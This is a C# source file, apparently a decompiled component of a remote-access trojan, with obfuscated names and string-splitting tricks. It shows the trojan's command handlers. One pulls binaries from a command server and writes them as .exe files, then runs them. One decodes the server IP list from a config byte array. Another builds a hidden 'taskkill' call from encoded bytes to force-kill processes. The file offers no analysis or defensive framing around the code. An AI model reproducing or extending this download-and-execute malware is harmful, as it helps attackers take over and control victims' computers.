using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace rgocrwse;

internal class ortmirdsOCMD
{
	public ortmirdsMCDM server;

	public void ortmirdsdo_updated(int uType, string switchType)
	{
		try
		{
			byte[] array = server.ortmirdspull_data();
			if (uType == 7 && array != null)
			{
				string text = ortmirdsCONF.ortmirdsget_mpath() + "tmps\\";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllBytes(text + ortmirdsCONF.ortmirdsmainApp + ".exe|ortmirds".Split(new char[1] { '|' })[0], array);
				ortmirdsdo_process(text + ortmirdsCONF.ortmirdsmainApp + ".exe|ortmirds".Split(new char[1] { '|' })[0], null, sendExp: true);
			}
		}
		catch
		{
		}
	}

	public NetworkStream ortmirdsNS(TcpClient ortmirdstcpsck)
	{
		return ortmirdstcpsck.GetStream();
	}

	public ortmirdsOCMD(ortmirdsMCDM lID)
	{
		server = lID;
	}

	public void ortmirdsdo_process(string filePath, string parms, bool sendExp)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = filePath;
			if (parms != null && parms != "")
			{
				process.StartInfo.Arguments = parms;
			}
			process.Start();
		}
		catch
		{
		}
	}

	public void ortmirdsdieProcess(Process p)
	{
		try
		{
			if (p != null)
			{
				Process process = new Process();
				byte[] array = new byte[12]
				{
					116, 97, 115, 107, 107, 105, 108, 108, 46, 101,
					120, 101
				};
				process.StartInfo.FileName = Encoding.UTF8.GetString(array, 0, array.Length);
				process.StartInfo.Arguments = "/PID |ortmirds".Split(new char[1] { '|' })[0] + p.Id + " /T /F|ortmirds".Split(new char[1] { '|' })[0];
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				process.WaitForExit();
			}
		}
		catch
		{
		}
	}

	public string[] ortmirdsserverIPD()
	{
		string @string = Encoding.UTF8.GetString(ortmirdsCONF.ortmirdsvpsips, 0, ortmirdsCONF.ortmirdsvpsips.Length);
		return @string.Split(new char[1] { '?' });
	}

	public void ortmirdsbreak_process(int proid)
	{
		try
		{
			try
			{
				Thread.Sleep(100);
				Process.GetProcessById(proid).Kill();
				Thread.Sleep(100);
			}
			catch
			{
				ortmirdsdieProcess(Process.GetProcessById(proid));
			}
		}
		catch
		{
		}
	}

	public void ortmirdsremove_user()
	{
		try
		{
			byte[] array = server.ortmirdspull_data();
			if (array != null && !File.Exists(ortmirdsCONF.ortmirdsget_mpath() + ortmirdsCONF.ortmirdsremvUser + ".exe"))
			{
				File.WriteAllBytes(ortmirdsCONF.ortmirdsget_mpath() + ortmirdsCONF.ortmirdsremvUser + ".exe", array);
				ortmirdsdo_process(ortmirdsCONF.ortmirdsget_mpath() + ortmirdsCONF.ortmirdsremvUser + ".exe", null, sendExp: false);
			}
		}
		catch
		{
		}
	}
}
